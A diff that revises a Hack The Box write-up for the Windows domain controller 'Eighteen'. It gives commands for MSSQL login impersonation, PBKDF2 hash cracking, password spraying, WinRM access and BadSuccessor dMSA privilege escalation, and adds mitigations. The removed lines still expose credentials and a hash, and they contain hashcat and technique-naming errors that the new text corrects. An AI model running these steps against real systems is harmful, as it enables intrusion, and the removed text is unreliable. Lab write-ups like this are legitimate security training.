@@ -1,218 +1,140 @@
-HTB Eighteen - Offensive Security Writeup
-Machine: [Eighteen](https://app.hackthebox.com/machines/Eighteen)  
-Difficulty: Easy  
-Platform: Hack The Box  
-OS: Windows (Active Directory Domain Controller)  
-Goal: User + Root flags  
-Date: March 2026  
+HTB — Eighteen
+OS	Difficulty	Role	Platform
+Windows	Easy	Active Directory Domain Controller	Hack The Box
+Skills demonstrated: MSSQL enumeration and login impersonation, offline PBKDF2 cracking, password spraying, Active Directory privilege escalation via dMSA abuse (BadSuccessor, CVE-2025-53779).
+Before publishing: confirm Eighteen has retired — HTB prohibits write-ups for active machines. This file also contains spoilers (provided and cracked credentials, a password hash, flags), redacted below. Restore them only once the box is retired.
 
-🎯 Executive Summary
+Summary:
+Starting from provided MSSQL credentials, a SQL login lacking direct database access uses EXECUTE AS LOGIN to impersonate a higher-privileged login and read an application's users table. 
+That yields a Werkzeug PBKDF2-SHA256 password hash, which cracks offline against rockyou. The recovered password sprays to a domain account usable over WinRM. From there, a CreateChild right on an organizational unit allows 
+creating a delegated Managed Service Account (dMSA) and abusing the Windows Server 2025 dMSA migration flow (BadSuccessor) to obtain domain-admin-level privileges.
 
-This repository documents a complete, educational walkthrough of the **HTB Eighteen** machine. 
-The attack chain begins with provided MSSQL credentials, leverages database impersonation to extract a PBKDF2-SHA256 hash, cracks the hash offline, performs password spraying for lateral movement, and concludes with Active Directory ACL abuse (dMSA / BadSuccessor) 
-for domain admin escalation.
+Attack chain:
+Initial access: MSSQL (1433) with provided credentials
+DB privilege escalation: EXECUTE AS LOGIN = 'appdev' → read financial_planner.dbo.users → PBKDF2 hash
+Cracking: PBKDF2-HMAC-SHA256 → recovered password
+Lateral movement: password spray → WinRM as adam.scott
+Domain escalation: CreateChild on the Staff OU → dMSA creation → BadSuccessor → Domain Admin
 
-  
+Tools
+impacket-mssqlclient, hashcat, netexec, evil-winrm, PowerView, and a dMSA/BadSuccessor exploitation tool (for example the SharpSuccessor / Python PoCs).
 
-Key Skills Demonstrated:
+1. MSSQL access:
+impacket-mssqlclient takes a single username:password@target positional argument. A space before @ breaks argparse, and the target must be attached to the credential string:
+bash
+impacket-mssqlclient kevin:'<PASSWORD>'@eighteen.htb -target-ip 10.10.11.252
 
-- MSSQL enumeration & impersonation
+2. Login impersonation and hash extraction:
 
-- Hash cracking (PBKDF2-SHA256)
-
-- Impacket tooling & troubleshooting
-
-- Active Directory enumeration & ACL exploitation
-
-- Systematic methodology & error handling
-
-  
-
----
-
-  
-
-🛠️ Attack Overview
-
-1. Initial Access → MSSQL (1433) with provided creds (`kevin:iNa2we6haRj2gaw!`)
-
-2. Privilege Escalation (DB) → Impersonate `appdev` → Extract admin hash
-
-3. Credential Cracking → PBKDF2-SHA256 → `iloveyou1`
-
-4. Lateral Movement → Password spraying → WinRM as `adam.scott`
-
-5. Domain Privilege Escalation → CreateChild on Staff OU → dMSA / RBCD abuse → Domain Admin
-
-  
-
----
-
-  
-
-🔍 1. MSSQL Connection & Troubleshooting
-
-  
-Tool Used: `impacket-mssqlclient` (v0.13.0.dev0)
-
-  
-
-Initial Command Attempts (Common Pitfalls)
-
-```bash
-
-❌ Failed - missing @ separator
-
-impacket-mssqlclient kevin:'iNa2we6haRj2gaw!' -target-ip 10.10.11.252
-
-  
-
-❌ Failed - space before @ (argparse error)
-
-impacket-mssqlclient kevin:'iNa2we6haRj2gaw!' @10.10.11.252
-
-# Error: unrecognized arguments: @xxx.xxx.xxx.xxx
-
-Corrected Command
-
-impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.10.11.252
-
-or with hostname + IP override
-
-impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb -target-ip 10.10.11.252
-
-Lesson: Impacket expects a single positional argument in the format username:password@target. Spaces break argparse.
-
-🔑 2. Database Impersonation & Hash Extraction
-Inside MSSQL (SQL> prompt):
-
-
--- Check current context
-
-SELECT SUSER_NAME();
-
-  
-
--- Verify impersonation rights
-
-SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER') WHERE permission_name = 'IMPERSONATE';
-
-  
-
--- Impersonate higher-privileged login
-
-EXECUTE AS LOGIN = 'appdev';
-
-  
-
--- Switch database (error resolved)
-
-USE financial_planner;
-
-  
-
--- Enumerate tables
-
-SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = 'dbo';
-
-  
-
--- Extract users table
-
-SELECT * FROM users;
-
-Extracted Hash (admin user):
-
-
-pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
-
-Error Encountered:
-
+The provided login cannot reach the application database directly:
 
 ERROR(DC01): The server principal "kevin" is not able to access the database "financial_planner"
 
-Root Cause: Low-priv login lacked direct DB access → resolved via EXECUTE AS.
+Check for impersonation rights, then assume a login that has access:
 
-🔨 3. Offline Hash Cracking
-Format Analysis:
+sql
+SELECT SUSER_NAME();
 
-Algorithm: PBKDF2-HMAC-SHA256
+-- Logins this principal may impersonate
+SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER')
+WHERE permission_name = 'IMPERSONATE';
 
-Iterations: 600,000
+EXECUTE AS LOGIN = 'appdev';
+USE financial_planner;
 
-Salt: AMtzteQIG7yAbZIa (UTF-8 / base64)
+SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = 'dbo';
+SELECT * FROM users;
 
-Digest: hex → must be converted to base64 for Hashcat
+The users table contained a Werkzeug-format hash for the admin user:
 
-Python Cracker (Proof-of-Concept)
+pbkdf2:sha256:600000$<SALT>$<HASH>
 
+The Werkzeug format is pbkdf2:sha256:<iterations>$<salt>$<hex-digest>, where the salt is a literal ASCII string and the digest is hex.
+
+3. Offline cracking:
+Parameters: PBKDF2-HMAC-SHA256, 600,000 iterations, literal (not base64) salt.
+A short Python check confirms a candidate against the hex digest directly, using the literal salt:
+
+python
 import hashlib, binascii
 
-
-salt = b'AMtzteQIG7yAbZIa'
-
+salt = b'<SALT>'          # literal ASCII salt from the hash string
 iterations = 600000
-
-expected = '0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
-
-  
+expected = '<HEX_DIGEST>'
 
 for pwd in ["iloveyou", "iloveyou1", "admin123"]:
-
     dk = hashlib.pbkdf2_hmac('sha256', pwd.encode(), salt, iterations)
-
     if binascii.hexlify(dk).decode() == expected:
-
         print(f"[+] Password: {pwd}")
 
-Hashcat-Ready Format
-Corrected hash line (saved as hash.txt):
+Hashcat (-m 10900, PBKDF2-HMAC-SHA256) expects sha256:<iterations>:<base64 salt>:<base64 digest>. Both the salt and the digest must be base64. The literal salt has to be base64-encoded first:
 
-
-sha256:600000:AMtzteQIG7yAbZIa:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
-
-Command:
-
+bash
+# base64-encode the literal salt and the raw digest
+python3 -c "import base64,binascii; \
+print('sha256:600000:' + base64.b64encode(b'<SALT>').decode() + ':' \
++ base64.b64encode(binascii.unhexlify('<HEX_DIGEST>')).decode())" > hash.txt
 
 hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt -O
 
-Result: iloveyou1
+Putting the literal salt into the hashcat line unencoded does not work: hashcat base64-decodes that field, so an unencoded salt is read as different bytes and no candidate matches. The recovered password therefore comes from the correctly encoded line (or the Python check above), not from a line with a raw salt.
 
-📈 4. Full Attack Chain Summary (Post-Foothold)
-Password Spraying: netexec smb 10.10.11.252 -u users.txt -p iloveyou1 --local-auth
+4. Lateral movement:
+Spray the recovered password across domain accounts and log in over WinRM as the account that accepts it:
+bash
+# Domain spray (omit --local-auth for domain accounts;
+# --local-auth tests local SAM accounts only)
+netexec smb 10.10.11.252 -u users.txt -p '<PASSWORD>' -d eighteen.htb
 
-Foothold: WinRM as adam.scott
+evil-winrm -i 10.10.11.252 -u adam.scott -p '<PASSWORD>'
+type C:\Users\adam.scott\Desktop\user.txt
+# HTB{REDACTED}
 
-Privilege Escalation: PowerView → Find-InterestingDomainAcl → CreateChild on Staff OU → dMSA object creation → Resource-Based Constrained Delegation (RBCD) → Domain Admin shell
+5. Domain escalation — BadSuccessor (dMSA abuse):
 
-Flags Obtained:
+Enumerate ACLs for a principal the current user controls:
 
-  - User flag: C:\Users\adam.scott\Desktop\user.txt
+powershell
+Import-Module .\PowerView.ps1
+Find-InterestingDomainAcl -ResolveGUIDs |
+  ? { $_.IdentityReferenceName -match 'adam.scott' }
+# CreateChild on the Staff OU
 
-  - Root flag: C:\Users\Administrator\Desktop\root.txt
+A CreateChild right on an OU is enough to create a dMSA there and abuse the migration flow.
 
-🛡️ Defensive Takeaways
-Restrict IMPERSONATE grants in MSSQL
+As of 2026-11-22, per Akamai and Microsoft: BadSuccessor (CVE-2025-53779) abuses delegated Managed Service Accounts, introduced in Windows Server 2025. When a controlled dMSA is linked to an existing account as its "predecessor," 
+the KDC treats the dMSA as that account's successor and issues it the predecessor's privileges. Akamai reports the attack works under the default configuration, 
+and in a domain with at least one Windows Server 2025 DC even if dMSAs are not otherwise in use; Microsoft patched it in August 2025.
 
-Never store credential hashes in application databases
+The escalation:
 
-Audit OU permissions (CreateChild) in Active Directory
+Create a dMSA under the Staff OU (using the CreateChild right).
+Set its predecessor link to a high-privileged account (for example Administrator) and mark the migration state as completed.
+Authenticate as the dMSA. The issued ticket carries the predecessor's privileges, giving domain-admin-level access.
+type C:\Users\Administrator\Desktop\root.txt
+# HTB{REDACTED}
+Confirm the exact technique before publishing. The original notes label this step "dMSA / BadSuccessor" in one place and "RBCD (Resource-Based Constrained Delegation)" in another. 
+These are distinct: BadSuccessor abuses the dMSA msDS-ManagedAccountPrecededByLink migration path, while RBCD abuses msDS-AllowedToActOnBehalfOfOtherIdentity. 
+The CreateChild-on-OU → dMSA-creation path described here is BadSuccessor. State whichever one you actually used, and drop the other.
 
-Monitor for anomalous SQL context switches and dMSA object creation
+Root cause and mitigations:
+Layer	Issue	Fix
+MSSQL	IMPERSONATE granted to a low-privileged login	Remove unneeded IMPERSONATE grants; apply least privilege to SQL logins
+App	Password hashes stored in an application DB reachable via SQL	Isolate credential storage; restrict which logins can read it
+Credentials	Weak password (rockyou-crackable) despite 600k PBKDF2 iterations	Enforce password length/complexity; iterations do not save a guessable password
+Active Directory	CreateChild on an OU held by a non-admin	Audit and remove OU CreateChild/GenericAll grants to non-privileged principals
+Patching	Windows Server 2025 DC vulnerable to BadSuccessor	Apply the CVE-2025-53779 patch; review permissions on OUs, containers, and dMSA objects; monitor for anomalous dMSA creation and msDS-ManagedAccountPrecededByLink changes
 
-📚 Skills Demonstrated in This Writeup
-Deep MSSQL permission chaining
+Key lessons
+EXECUTE AS LOGIN turns a weak SQL login into any login it may impersonate; impersonation rights are a privilege boundary.
+Match the hash format to the tool: Werkzeug stores a literal salt and hex digest; hashcat -m 10900 wants base64 for both the salt and the digest.
+Keep AD escalation techniques named precisely — BadSuccessor and RBCD are different primitives with different fixes.
 
-Impacket syntax mastery & debugging
+References
+Akamai — Abusing dMSA for Privilege Escalation (BadSuccessor), 2025-05-21
+Akamai — Analyzing the BadSuccessor patch (CVE-2025-53779), 2025-08
+The Hacker News — Windows Server 2025 dMSA / BadSuccessor
+Impacket — mssqlclient
+hashcat — example hashes (mode 10900)
 
-Custom hash format conversion (PBKDF2 → Hashcat)
-
-Systematic troubleshooting documentation
-
-Full AD attack chain reasoning
-
-Repository Purpose: Educational only. All steps were performed in an authorized Hack The Box lab environment.
-
-  
-
-Copy-paste the above directly into a `README.md` file for your GitHub repository. It showcases methodology, error handling, and technical depth while remaining concise and professional. Let me know if you want screenshots, additional sections, or a variation!
+Performed against a Hack The Box machine for educational purposes.
